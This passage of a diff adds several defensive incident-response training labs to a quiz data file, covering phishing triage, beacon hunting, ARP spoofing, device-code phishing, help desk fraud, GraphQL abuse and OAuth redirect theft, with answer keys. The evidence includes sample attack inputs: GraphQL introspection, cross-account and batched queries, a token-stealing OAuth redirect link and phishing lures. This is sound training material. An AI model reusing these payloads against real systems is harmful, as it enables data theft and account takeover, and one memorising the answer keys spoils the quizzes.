@@ -5309,4 +5309,986 @@ SharePoint "IT-KB" library (Edit: All Employees + Contractors) -> nightly index 
       },
     ],
   },
+  {
+    id: 'lab-52',
+    title: 'Browser Forensics on a Data Theft Suspect',
+    domain: 1,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'HR suspects that a departing engineer uploaded design files to a personal cloud account before resigning. You have a forensic image of the laptop with Chrome and Edge profiles. Reconstruct the browser activity and report what you can prove.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Locate the right databases',
+        evidence: r`C:\Users\d.park\AppData\Local\Google\Chrome\User Data\Default\
+  History          (SQLite: urls, visits, downloads)
+  Cookies          (SQLite, values encrypted with DPAPI)
+  Web Data         (autofill)
+  Login Data       (saved credentials, encrypted)`,
+        question: 'Which file holds the visited URLs and download records?',
+        options: [
+          'Cookies',
+          'History',
+          'Web Data',
+          'Login Data',
+        ],
+        correctIndex: 1,
+        hint: 'Visits and downloads share one database.',
+        walkthrough: 'Chrome\'s History SQLite database contains the urls, visits, and downloads tables. Work from a copy of the image, never the live profile, and keep hashes of what you parsed.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Query visits',
+        evidence: r`sqlite> SELECT datetime(v.visit_time/1000000-11644473600,'unixepoch'), u.url
+        FROM visits v JOIN urls u ON v.url=u.id
+        WHERE u.url LIKE '%drive%' OR u.url LIKE '%upload%' ORDER BY 1;
+2026-09-14 19:02:44 | https://drive.personal-cloud.example/upload
+2026-09-14 19:03:10 | https://drive.personal-cloud.example/upload?status=complete&files=14`,
+        question: 'Why does the query subtract 11644473600 seconds?',
+        options: [
+          'To remove leap seconds',
+          'To convert to the local time zone',
+          'Chrome stores times as microseconds since 1601-01-01 (WebKit time), so the offset converts them to Unix time',
+          'It is a bug in the query',
+        ],
+        correctIndex: 2,
+        hint: 'WebKit and Windows FILETIME use the same 1601 epoch.',
+        walkthrough: 'Chrome timestamps count microseconds from 1601. Dividing by one million and subtracting 11,644,473,600 seconds gives a Unix timestamp. Always state the time zone (UTC here) in your report.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Tie files to the upload',
+        evidence: r`Jump list / RecentDocs for chrome.exe (file picker)
+2026-09-14 19:02:58  C:\Projects\Orion\CAD\housing_rev7.step
+2026-09-14 19:02:58  C:\Projects\Orion\CAD\drivetrain_rev3.step
+... (14 entries)`,
+        question: 'What do these entries add?',
+        options: [
+          'Nothing, jump lists only show games',
+          'They prove the files were deleted',
+          'They show the files were emailed',
+          'They show which local files were selected in the browser\'s file dialog seconds before the upload completed',
+        ],
+        correctIndex: 3,
+        hint: 'Compare timing to the upload URL.',
+        walkthrough: 'The file open dialog records recent selections. Fourteen CAD files chosen at 19:02:58 lines up with an upload that reports files=14 at 19:03:10. Together they form a strong inference, though the cloud provider\'s logs would confirm the content.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Check for anti-forensics',
+        evidence: r`Edge History: last visit 2026-09-14 18:40, then no entries until 2026-09-16
+Edge Preferences: "clear_data_on_exit": true set 2026-09-14 18:41
+Chrome: Incognito use leaves no History rows`,
+        question: 'How should you treat the gap in Edge history?',
+        options: [
+          'As possible deliberate clearing, which you report as an observation along with other sources like DNS cache, proxy logs, and the SRUM database',
+          'As proof nothing happened',
+          'As proof of guilt',
+          'Ignore it',
+        ],
+        correctIndex: 0,
+        hint: 'Absence of evidence is not evidence of absence.',
+        walkthrough: 'Clearing settings changed minutes before the upload window. Report it neutrally. Corroborate with network-side sources like proxy logs and SRUM network usage, which record per-app bytes sent even when browser history is gone.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Write the conclusion',
+        evidence: r`Proxy log: d.park  POST drive.personal-cloud.example  2026-09-14 19:02:46-19:03:09  bytes_out 412 MB
+SRUM: chrome.exe  bytes sent 2026-09-14 19:00-20:00  418 MB`,
+        question: 'Which conclusion is best supported?',
+        options: [
+          'd.park stole all company data',
+          'On 09-14 between 19:02 and 19:03 UTC, d.park\'s account uploaded about 412 MB through Chrome to a personal cloud service, and file dialog records show 14 CAD files from the Orion project selected at that time',
+          'The upload contained only personal photos',
+          'Nothing can be concluded without a confession',
+        ],
+        correctIndex: 1,
+        hint: 'State facts with sources and avoid overreach.',
+        walkthrough: 'Browser history, file dialog records, proxy logs, and SRUM independently agree on timing and volume. The report should state what each source shows and leave intent and legal conclusions to HR and counsel.',
+      },
+    ],
+  },
+  {
+    id: 'lab-53',
+    title: 'Email Header Analysis and Sandbox Triage',
+    domain: 1,
+    difficulty: 'Easy',
+    xpReward: 250,
+    briefing: 'The CFO forwarded an email that appears to come from the company\'s bank asking to confirm a wire. It has an HTML attachment. Determine if it is malicious using the headers and a sandbox, and decide on the response.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Read the authentication results',
+        evidence: r`Return-Path: <billing@secure-bank-notices.example>
+From: "Northbank Treasury" <treasury@northbank.example>
+Authentication-Results: mx.corp.example;
+  spf=pass smtp.mailfrom=secure-bank-notices.example;
+  dkim=pass header.d=secure-bank-notices.example;
+  dmarc=fail (p=none) header.from=northbank.example`,
+        question: 'Why does DMARC fail even though SPF and DKIM pass?',
+        options: [
+          'SPF passing means the email is genuine',
+          'DMARC always fails for banks',
+          'The DKIM key expired',
+          'SPF and DKIM passed for a different domain than the visible From address, so they are not aligned with northbank.example',
+        ],
+        correctIndex: 3,
+        hint: 'DMARC checks alignment with the From domain.',
+        walkthrough: 'An attacker can send from their own domain with valid SPF and DKIM. DMARC requires that domain to match the header From. Here it does not, so the message is spoofing northbank.example. The bank\'s p=none policy means receivers do not reject it.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Trace the path',
+        evidence: r`Received: from mail.secure-bank-notices.example (198.51.100.140) by mx.corp.example
+X-Originating-IP: 198.51.100.140
+Reply-To: treasury.ops@northbank-payments.example`,
+        question: 'What is the risk of the Reply-To header?',
+        options: [
+          'It means the email is encrypted',
+          'Replies go to the bank\'s support team',
+          'Replies go to an attacker-controlled lookalike domain instead of the real bank',
+          'It is only used for read receipts',
+        ],
+        correctIndex: 2,
+        hint: 'Who would get the CFO\'s answer?',
+        walkthrough: 'A mismatched Reply-To is common in business email compromise. Even without opening the attachment, replying would start a conversation with the attacker.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Analyze the attachment',
+        evidence: r`Sandbox report: Wire_Confirmation.html
+- Renders a fake Microsoft 365 sign-in page
+- Form posts to https://login-m365-secure.example/collect.php
+- JavaScript fetches the victim's email from URL fragment to prefill
+- No file drop, no process spawn`,
+        question: 'How should this attachment be classified?',
+        options: [
+          'A keylogger',
+          'Ransomware',
+          'A harmless invoice',
+          'A credential phishing page delivered as a local HTML file to avoid URL filters',
+        ],
+        correctIndex: 3,
+        hint: 'What does the page do with typed data?',
+        walkthrough: 'HTML smuggling or local phishing pages avoid link scanning because the page runs from the user\'s disk. It harvests credentials by posting them to the attacker\'s site.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Scope the campaign',
+        evidence: r`Message trace (last 48h): same sender domain, 23 recipients
+Clicks logged by Safe Links: 0 (attachment is local)
+Proxy: POST to login-m365-secure.example from 2 internal IPs`,
+        question: 'Which users need the most urgent action?',
+        options: [
+          'No one, since Safe Links showed no clicks',
+          'All 23 recipients need new laptops',
+          'Only the CFO',
+          'The two users whose machines posted to the phishing site, because they likely entered credentials',
+        ],
+        correctIndex: 3,
+        hint: 'Safe Links cannot see local HTML attachments.',
+        walkthrough: 'Proxy logs reveal who submitted the form. Those two accounts need password resets, session revocation, and a sign-in review. Purge the message from all 23 mailboxes and block the domains.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Strengthen defenses',
+        evidence: r`Proposals
+- Block or sandbox .html/.htm attachments from external senders
+- Report lookalike domains for takedown
+- Ask Northbank to move DMARC to p=reject
+- Require call-back verification for wire changes`,
+        question: 'Which control addresses the business process risk rather than the technical one?',
+        options: [
+          'Call-back verification for wire changes using a known phone number',
+          'Blocking HTML attachments',
+          'Domain takedown',
+          'DMARC reject',
+        ],
+        correctIndex: 0,
+        hint: 'Which one would stop the fraud even if the email got through?',
+        walkthrough: 'Technical controls reduce delivery. An out-of-band verification step for payment changes stops fraud even when a convincing message lands, which is why it is a core BEC control.',
+      },
+    ],
+  },
+  {
+    id: 'lab-54',
+    title: 'Finding a Jittered Beacon with RITA',
+    domain: 2,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'Threat intel warns that a group targeting your sector uses implants that beacon with heavy jitter to avoid simple interval detection. Analyze a week of Zeek connection logs with RITA and confirm or rule out a beacon.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Review the beacon scores',
+        evidence: r`$ rita show-beacons corp-week36 | head -4
+Score  Source        Destination      Connections  Avg Bytes  TS Score  DS Score  Dur Score
+0.91   10.40.7.22    203.0.113.200    1,986        612        0.84      0.97      0.88
+0.88   10.40.2.10    52.96.0.14       10,512       4,102      0.86      0.55      0.99
+0.62   10.40.9.31    198.51.100.12    210          120        0.51      0.70      0.40`,
+        question: 'What makes the top entry interesting despite jitter?',
+        options: [
+          'It has the lowest score',
+          'It has the most connections',
+          'It connects to Microsoft',
+          'Very consistent data sizes and a steady connection pattern across the week, even though intervals vary',
+        ],
+        correctIndex: 3,
+        hint: 'Look at the DS (data size) score.',
+        walkthrough: 'Jitter randomizes intervals, but implants often send nearly identical check-in packets. RITA scores interval skew, size consistency, and duration. A 0.97 size score with a high overall score is a strong lead.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Rule out the second entry',
+        evidence: r`52.96.0.14 -> outlook.office365.com
+Source 10.40.2.10 = EXCH-HYB01 (hybrid mail relay)`,
+        question: 'How should you handle this result?',
+        options: [
+          'Isolate the Exchange server',
+          'Treat it as expected service traffic and add it to the RITA safelist after confirming the host and destination',
+          'Block Office 365',
+          'Escalate as a confirmed C2',
+        ],
+        correctIndex: 1,
+        hint: 'Some services beacon by design.',
+        walkthrough: 'Mail relays, update agents, and monitoring tools make regular connections. Validate, then safelist so analysts focus on unknowns.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Investigate the destination',
+        evidence: r`203.0.113.200
+WHOIS: small VPS provider, registered 2026-08-01
+Passive DNS: cdn-metrics-sync.example (first seen 2026-08-03)
+TLS cert: self-signed, CN=localhost
+JA3S matches a public C2 framework default profile`,
+        question: 'Which findings increase confidence it is C2?',
+        options: [
+          'Using port 443',
+          'Being in WHOIS at all',
+          'Using HTTPS',
+          'A newly registered domain on a VPS, a self-signed certificate, and a server fingerprint matching a known C2 framework',
+        ],
+        correctIndex: 3,
+        hint: 'Combine several weak signals.',
+        walkthrough: 'Each point alone is weak, but together they fit attacker infrastructure. A legitimate CDN would use a trusted cert and a well-known provider.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Check the endpoint',
+        evidence: r`EDR on 10.40.7.22 (ENG-WS22)
+Process with network connections to 203.0.113.200: C:\Users\Public\Libraries\msedgeupd.exe
+Signed: No   Parent: explorer.exe   Persistence: HKCU\...\Run "EdgeUpdate"`,
+        question: 'What is the appropriate next step?',
+        options: [
+          'Reboot the host to clear memory',
+          'Delete the Run key and move on',
+          'Isolate the host, collect memory and the binary, and hunt for the hash and destination across the environment',
+          'Wait another week of beacons',
+        ],
+        correctIndex: 2,
+        hint: 'Preserve volatile evidence before cleaning.',
+        walkthrough: 'An unsigned binary in a public folder with Run key persistence is malicious. Isolation stops C2, memory capture preserves injected code and config, and a hunt finds other infected hosts.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Make it repeatable',
+        evidence: 'Proposal: nightly RITA import of Zeek logs, alert on score > 0.8 for destinations not in safelist and not in top 10k domains',
+        question: 'Why filter out popular domains?',
+        options: [
+          'Most high-volume legitimate services live on popular domains, so filtering them cuts noise while rare destinations stay visible',
+          'Popular domains cannot host C2',
+          'RITA cannot score them',
+          'To reduce storage costs',
+        ],
+        correctIndex: 0,
+        hint: 'Think about base rates, and the limits of this filter.',
+        walkthrough: 'Attackers sometimes use popular cloud services for C2, so the filter is a tradeoff. It keeps the alert queue manageable. Pair it with other hunts for C2 over trusted services.',
+      },
+    ],
+  },
+  {
+    id: 'lab-55',
+    title: 'ARP Spoofing on a Branch Office LAN',
+    domain: 2,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'Users at a branch office report certificate warnings when they browse, and VoIP calls drop. A network engineer suspects someone on the LAN is intercepting traffic. Investigate with switch data and a packet capture.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Check the gateway entry',
+        evidence: r`C:\> arp -a
+Interface: 10.60.1.45
+  Internet Address      Physical Address
+  10.60.1.1             a4-5e-60-11-22-33   dynamic
+  10.60.1.77            a4-5e-60-11-22-33   dynamic`,
+        question: 'What is wrong in this ARP table?',
+        options: [
+          'The gateway and another host share the same MAC address, which suggests the host at 10.60.1.77 is claiming to be the gateway',
+          'ARP tables never show dynamic entries',
+          'The gateway is offline',
+          'The MAC address format is invalid',
+        ],
+        correctIndex: 0,
+        hint: 'Two IPs, one MAC.',
+        walkthrough: 'In ARP spoofing, the attacker sends forged replies so victims map the gateway IP to the attacker\'s MAC. Traffic then flows through the attacker, enabling interception.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Confirm in the capture',
+        evidence: r`tcpdump -nn -e arp
+14:22:01.10 a4:5e:60:11:22:33 > ff:ff:ff:ff:ff:ff, ARP Reply 10.60.1.1 is-at a4:5e:60:11:22:33
+14:22:03.10 a4:5e:60:11:22:33 > ff:ff:ff:ff:ff:ff, ARP Reply 10.60.1.1 is-at a4:5e:60:11:22:33
+14:22:05.10 ... (repeats every 2s)`,
+        question: 'Why are these replies suspicious?',
+        options: [
+          'It means the switch is failing',
+          'ARP replies always repeat every two seconds',
+          'It is DHCP traffic',
+          'Unsolicited (gratuitous) ARP replies are being broadcast every two seconds to keep victims\' caches poisoned',
+        ],
+        correctIndex: 3,
+        hint: 'Was there a request for each reply?',
+        walkthrough: 'Normal ARP replies answer requests. A steady stream of unsolicited replies for the gateway IP keeps overwriting cached entries, which is typical of spoofing tools.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Find the physical port',
+        evidence: r`switch# show mac address-table address a4:5e:60:11:22:33
+Vlan  Mac Address       Type     Ports
+10    a4:5e:60:11:22:33 DYNAMIC  Gi1/0/18
+switch# show interfaces Gi1/0/18 description
+Gi1/0/18  "Conf Room B wall jack"`,
+        question: 'What does this tell you?',
+        options: [
+          'The device is plugged into the conference room wall jack, so someone can physically locate and remove it',
+          'The gateway is on port 18',
+          'The attack is coming from the internet',
+          'The MAC belongs to the switch',
+        ],
+        correctIndex: 0,
+        hint: 'MAC tables map addresses to ports.',
+        walkthrough: 'The switch\'s MAC table leads to a specific port and location. Shut the port or physically retrieve the device, preserving it as evidence.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Assess impact',
+        evidence: r`Capture during spoofing window (13:50-14:30)
+HTTPS sessions with certificate issuer "mitm-proxy CA": 61
+Plaintext protocols seen: HTTP to intranet wiki, SIP/RTP, LDAP simple bind from PRN-02`,
+        question: 'Which data is most likely exposed?',
+        options: [
+          'Only DNS queries',
+          'All HTTPS traffic was fully decrypted without warnings',
+          'Nothing, since ARP spoofing cannot read data',
+          'Plaintext traffic like the LDAP simple bind credentials from the printer and intranet HTTP sessions; HTTPS was exposed only where users clicked through warnings',
+        ],
+        correctIndex: 3,
+        hint: 'Certificate warnings mean the browser detected interception.',
+        walkthrough: 'TLS stopped silent interception, and users who accepted the bad cert may have exposed data. Plaintext protocols like LDAP simple binds leak credentials outright, so reset that service account.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Prevent it',
+        evidence: r`Switch hardening options
+- ip dhcp snooping
+- ip arp inspection vlan 10
+- port security / 802.1X on wall jacks`,
+        question: 'How does Dynamic ARP Inspection stop this attack?',
+        options: [
+          'It blocks all broadcast traffic',
+          'It encrypts ARP',
+          'It disables ARP',
+          'The switch checks ARP packets against the DHCP snooping binding table and drops replies that claim an IP the port was not assigned',
+        ],
+        correctIndex: 3,
+        hint: 'DAI relies on DHCP snooping data.',
+        walkthrough: 'DAI validates IP-to-MAC claims on untrusted ports. With 802.1X on public jacks, unknown devices cannot join the VLAN at all. Also replace LDAP simple binds with LDAPS.',
+      },
+    ],
+  },
+  {
+    id: 'lab-56',
+    title: 'Device Code Phishing Against Entra ID',
+    domain: 3,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'An account in the legal department is sending internal phishing messages. The user insists they never entered their password anywhere strange, and MFA is enforced. Investigate the sign-in logs to figure out how the attacker got a token.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Review the sign-in',
+        evidence: r`Entra sign-in log, user k.bauer@corp.example
+Time                 App                          Protocol     IP             Status  MFA
+2026-10-02 10:14:31  Microsoft Office             deviceCode   198.51.100.66  Success  satisfied (previous)
+2026-10-02 10:13:58  Microsoft Authentication Br  -            10.80.2.19     Success  satisfied`,
+        question: 'What does the deviceCode protocol indicate?',
+        options: [
+          'The account has no MFA',
+          'The user logged in on a printer',
+          'A password spray succeeded',
+          'The token was issued through the device code flow, where the user entered a code on the real Microsoft site that the attacker had started',
+        ],
+        correctIndex: 3,
+        hint: 'In device code flow, who starts the request and who approves it?',
+        walkthrough: 'The attacker starts a device code login and sends the code to the victim, often as a fake Teams or document prompt. The victim enters it at microsoft.com/devicelogin and completes MFA. The attacker\'s session then receives the tokens.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find the lure',
+        evidence: r`Mailbox trace for k.bauer, 10:09
+From: "IT Service Desk" <it-support@corp-helpdesk.example>
+Subject: Action required: re-verify your Teams device
+Body: Go to microsoft.com/devicelogin and enter code H7KQ-2MPA`,
+        question: 'Why did this bypass user training about fake login pages?',
+        options: [
+          'The user ignored training',
+          'The link points to the genuine Microsoft URL, so there was no fake page to spot',
+          'The email was from a real IT employee',
+          'MFA was disabled',
+        ],
+        correctIndex: 1,
+        hint: 'The domain the user visited was real.',
+        walkthrough: 'Device code phishing abuses a legitimate flow. Users see the real Microsoft domain and their normal MFA prompt. Training should explain that you should never enter a device code you did not start yourself.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Contain the access',
+        evidence: r`Tokens: refresh token issued to 198.51.100.66, client = Microsoft Office
+Activity: Mail.Read, Mail.Send, Files.Read.All via Graph API since 10:15`,
+        question: 'Which action actually stops the attacker?',
+        options: [
+          'Revoke the user\'s refresh tokens and sessions, reset the password, and block the attacker IP, then review mailbox rules and OAuth grants',
+          'Reset the password only',
+          'Disable MFA for the user',
+          'Delete the phishing email',
+        ],
+        correctIndex: 0,
+        hint: 'Refresh tokens survive password resets in some cases.',
+        walkthrough: 'Revoking sign-in sessions invalidates refresh tokens so the attacker cannot mint new access tokens. Also check for inbox rules, forwarding, and app consents created during the access window.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Scope the spread',
+        evidence: r`Messages sent by k.bauer 10:20-11:05: 46 internal recipients
+Subject: "Updated engagement letter - review in Teams"
+Recipients with deviceCode sign-ins after 10:20: 3`,
+        question: 'What is the next priority?',
+        options: [
+          'Notify only k.bauer\'s manager',
+          'Treat the three users with device code sign-ins as compromised and repeat containment for each, then purge the messages',
+          'Wait for users to report',
+          'Block all external email',
+        ],
+        correctIndex: 1,
+        hint: 'The attacker is using the account to phish internally.',
+        walkthrough: 'Internal phishing from a trusted account is effective. Any recipient with a device code sign-in after the messages were sent needs the same token revocation and review.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Reduce the attack surface',
+        evidence: r`Conditional Access options
+A) Block authentication flows: device code flow, except for named conference room devices
+B) Require compliant device for Office apps
+C) Disable MFA reminders`,
+        question: 'Which policy most directly prevents this technique?',
+        options: [
+          'C',
+          'A, block the device code flow for all users except those who need it',
+          'Allow device code from any IP',
+          'Increase password length',
+        ],
+        correctIndex: 1,
+        hint: 'Most users never need device code sign-in.',
+        walkthrough: 'Conditional Access can block the device code flow. Only a small set of input-constrained devices need it, so scoping it to them removes the attack path for everyone else. Compliant device requirements add defense in depth.',
+      },
+    ],
+  },
+  {
+    id: 'lab-57',
+    title: 'Help Desk Social Engineering and MFA Reset',
+    domain: 3,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'An attacker called the help desk pretending to be a regional sales director, got MFA reset, and logged in to the VPN. The fraud team noticed because the real director was on a flight. Reconstruct what happened and fix the process gap.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Review the ticket',
+        evidence: r`ServiceDesk ticket INC-88120  2026-10-11 06:42
+Caller: "Rafael Kim, Sales Director APAC" (callback number given by caller)
+Verification: employee ID + manager name (both found on LinkedIn/org chart)
+Action: MFA methods cleared, temporary access pass issued`,
+        question: 'What was the process weakness?',
+        options: [
+          'The ticket system was hacked',
+          'The agent was too slow',
+          'Verification relied on information that is easy to find publicly and a callback number supplied by the caller',
+          'The employee ID was wrong',
+        ],
+        correctIndex: 2,
+        hint: 'Could an outsider know these answers?',
+        walkthrough: 'Employee IDs and manager names often appear in org charts, badges, or social media. A callback to a number the caller provides proves nothing. Verification must use something only the real person has.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Trace the attacker\'s activity',
+        evidence: r`Entra audit log
+06:47  User registered security info: Authenticator app (new device "iPhone 15")
+06:49  Sign-in: VPN (GlobalProtect)  IP 203.0.113.25  Location: unexpected country
+07:02  Sign-in: SharePoint  site: /sites/SalesPricing  downloads: 212 files`,
+        question: 'What is the attacker\'s objective based on activity?',
+        options: [
+          'Deploying ransomware on the VPN appliance',
+          'Testing VPN performance',
+          'Collecting sales pricing data from SharePoint after establishing persistent MFA on their own device',
+          'No meaningful activity',
+        ],
+        correctIndex: 2,
+        hint: 'Follow what they did after logging in.',
+        walkthrough: 'The attacker first registered their own authenticator to keep access, then went to a high-value data site. That shapes the impact assessment: commercial data exposure.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Contain',
+        evidence: r`Account: r.kim  Status: active
+Registered methods: Authenticator (iPhone 15, added 06:47)
+Active sessions: VPN, SharePoint, Outlook web`,
+        question: 'Which containment is complete?',
+        options: [
+          'Reset the password only',
+          'Remove the authenticator only',
+          'Remove the attacker\'s authenticator, revoke all sessions, reset the password, block the IP, and re-verify the real user in person before restoring access',
+          'Call the number the attacker gave to confirm',
+        ],
+        correctIndex: 2,
+        hint: 'Remove both what they know and what they hold.',
+        walkthrough: 'The attacker holds a registered MFA method and active tokens. All must go, and the real user needs a verified recovery path so the attacker cannot repeat the call.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Check for repeat attempts',
+        evidence: r`Help desk call log, last 30 days
+Requests for MFA reset from callers claiming executive roles: 9
+Of those, approved: 7, verified via manager video call: 1`,
+        question: 'What does this suggest?',
+        options: [
+          'The help desk is doing a perfect job',
+          'Other approved resets might also be fraudulent and should be reviewed for suspicious sign-ins afterward',
+          'Only executives use MFA',
+          'The log is incomplete so ignore it',
+        ],
+        correctIndex: 1,
+        hint: 'This group often makes several attempts.',
+        walkthrough: 'Groups using help desk social engineering often target several accounts. Review each approved reset for new method registrations from unusual devices and sign-ins from unusual locations.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Fix the process',
+        evidence: r`Proposed verification for MFA resets
+- Video call with ID check, or manager approval through a ticket, not a phone call
+- Callback only to the number in the HR system
+- Mandatory delay and notification to the user's existing email/phone
+- Alert SOC on any privileged or executive MFA reset`,
+        question: 'Why notify the user\'s existing contact methods?',
+        options: [
+          'To fill the inbox',
+          'The real user can spot and report a reset they did not ask for, which gives early warning',
+          'It is required by DMARC',
+          'It replaces identity verification',
+        ],
+        correctIndex: 1,
+        hint: 'Who would notice an unexpected change first?',
+        walkthrough: 'Out-of-band notification turns the legitimate user into a detection sensor. Combined with stronger verification and SOC alerting, it closes the gap that let this attack succeed.',
+      },
+    ],
+  },
+  {
+    id: 'lab-58',
+    title: 'GraphQL Abuse Against a Customer API',
+    domain: 4,
+    difficulty: 'Medium',
+    xpReward: 250,
+    briefing: 'A retail app\'s GraphQL API saw a spike in requests and a customer reports their saved addresses were viewed by someone else. The WAF did not alert. Analyze the GraphQL traffic and fix the API.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Spot introspection',
+        evidence: r`POST /graphql  {"query":"query { __schema { types { name fields { name } } } }"}  200  148 KB
+Source: 203.0.113.91  User-Agent: python-requests/2.32`,
+        question: 'What did this request give the attacker?',
+        options: [
+          'Nothing, it returned an error',
+          'An admin token',
+          'The database password',
+          'The full API schema, including hidden or internal types and fields',
+        ],
+        correctIndex: 3,
+        hint: '__schema is the introspection system field.',
+        walkthrough: 'Introspection returns every type and field. In production it hands attackers a map of the API, including internal operations that the mobile app never calls.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find the data access flaw',
+        evidence: r`POST /graphql
+{"query":"query { customer(id: 88213) { email addresses { line1 city zip } orders { total } } }"}
+Response 200 with data for customer 88213 (requester session is customer 41007)`,
+        question: 'What vulnerability is shown?',
+        options: [
+          'Cross-site scripting',
+          'SQL injection',
+          'Broken object level authorization, because the resolver returns any customer\'s data by ID without checking ownership',
+          'Rate limiting',
+        ],
+        correctIndex: 2,
+        hint: 'Whose data came back?',
+        walkthrough: 'The resolver trusts the id argument. Authorization must happen in the resolver or data layer for every object, comparing it to the authenticated identity.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Notice the batching',
+        evidence: r`POST /graphql  (single HTTP request)
+[{"query":"query{customer(id:88001){email}}"},{"query":"query{customer(id:88002){email}}"}, ... 500 operations]
+WAF: 1 request, under rate limit`,
+        question: 'Why did rate limiting not catch this?',
+        options: [
+          'GraphQL cannot be rate limited',
+          'The WAF was off',
+          'Batching puts hundreds of operations in one HTTP request, so per-request limits see only one hit',
+          'The requests used IPv6',
+        ],
+        correctIndex: 2,
+        hint: 'Count operations, not requests.',
+        walkthrough: 'GraphQL batching and aliases let one request perform many queries. Limits need to count operations or query cost, not HTTP requests.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Scope the exposure',
+        evidence: r`Resolver audit log (customer query where requester != id)
+Unique customer IDs accessed by sessions from 203.0.113.91: 61,420
+Fields returned: email, addresses, order totals`,
+        question: 'What is the appropriate response?',
+        options: [
+          'Only block the IP',
+          'Revoke the attacker\'s sessions and accounts, block the source, and start breach assessment and notification for the 61,420 customers',
+          'Ask customers to change passwords',
+          'Turn off the mobile app permanently',
+        ],
+        correctIndex: 1,
+        hint: 'Personal data of many customers left the system.',
+        walkthrough: 'Email and home addresses are personal data. This likely triggers notification duties. Also review whether other operations had the same authorization flaw.',
+      },
+      {
+        stepNumber: 5,
+        objective: 'Harden the API',
+        evidence: r`Proposed GraphQL controls
+- Disable introspection in production
+- Per-resolver authorization checks
+- Query depth and cost limits; cap batch size and aliases
+- Persisted queries for the mobile app`,
+        question: 'Which control fixes the actual data leak?',
+        options: [
+          'Per-resolver authorization checks',
+          'Disabling introspection',
+          'Persisted queries alone',
+          'Depth limits',
+        ],
+        correctIndex: 0,
+        hint: 'The others slow attackers down; one closes the hole.',
+        walkthrough: 'Hiding the schema and limiting cost make abuse harder, but only authorization in each resolver prevents users from reading others\' data. Use all of them together for defense in depth.',
+      },
+    ],
+  },
+  {
+    id: 'lab-59',
+    title: 'OAuth Redirect URI Token Theft',
+    domain: 4,
+    difficulty: 'Hard',
+    xpReward: 250,
+    briefing: 'A partner integration platform lets users "Sign in with CorpID". Several users had their accounts accessed after clicking a link to a seemingly legitimate login page. Investigate the OAuth flow and find the misconfiguration.',
+    steps: [
+      {
+        stepNumber: 1,
+        objective: 'Examine the link',
+        evidence: r`https://id.corp.example/oauth2/authorize?client_id=partner-portal&response_type=token
+&redirect_uri=https://partner.corp.example.attacker-cdn.example/callback&scope=openid profile files.read`,
+        question: 'What is suspicious about this authorization request?',
+        options: [
+          'It uses HTTPS',
+          'The redirect_uri points to an attacker domain that merely starts with the legitimate host name',
+          'It includes a client_id',
+          'It requests the openid scope',
+        ],
+        correctIndex: 1,
+        hint: 'Read the full host name to the end.',
+        walkthrough: 'The host is attacker-cdn.example with a subdomain made to look legitimate. If the identity provider accepts it, the token is sent to the attacker after the user signs in on the real login page.',
+      },
+      {
+        stepNumber: 2,
+        objective: 'Find why the IdP accepted it',
+        evidence: r`Client registration: partner-portal
+redirect_uri validation: prefix match
+Allowed: https://partner.corp.example`,
+        question: 'Which validation flaw allowed the attack?',
+        options: [
+          'The scope was too narrow',
+          'Exact matching',
+          'The client secret was weak',
+          'Prefix matching accepts any URL that begins with the allowed string, including attacker-controlled hosts',
+        ],
+        correctIndex: 3,
+        hint: 'https://partner.corp.example.attacker-cdn.example starts with the allowed string.',
+        walkthrough: 'Redirect URIs must be matched exactly against registered values. Prefix, wildcard, or substring matching enables token theft and open redirect chains.',
+      },
+      {
+        stepNumber: 3,
+        objective: 'Understand the grant type risk',
+        evidence: r`response_type=token (implicit flow)
+Access token returned in URL fragment to redirect_uri`,
+        question: 'Why does the implicit flow make this worse?',
+        options: [
+          'Implicit flow requires a password',
+          'The access token itself is delivered to the redirect URI, so whoever controls that URI gets a usable token immediately',
+          'Fragments are encrypted',
+          'It does not affect anything',
+        ],
+        correctIndex: 1,
+        hint: 'What lands at the redirect URI?',
+        walkthrough: 'With the authorization code flow plus PKCE, a stolen code is useless without the verifier. The implicit flow sends the bearer token directly, so a bad redirect means instant account access.',
+      },
+      {
+        stepNumber: 4,
+        objective: 'Scope the impact',
+        evidence: r`IdP logs: tokens issued to client partner-portal with redirect host != partner.corp.example
+Count: 74 users, scope files.read
+API logs: files downloaded with those tokens: 1,930`,
+        question: 'What should you do with these tokens?',
+        options: [
+          'Reset users\' passwords only',
+          'Wait for them to expire',
+          'Revoke them, notify affected users, and review which files were downloaded to assess exposure',
+          'Delete the client registration logs',
+        ],
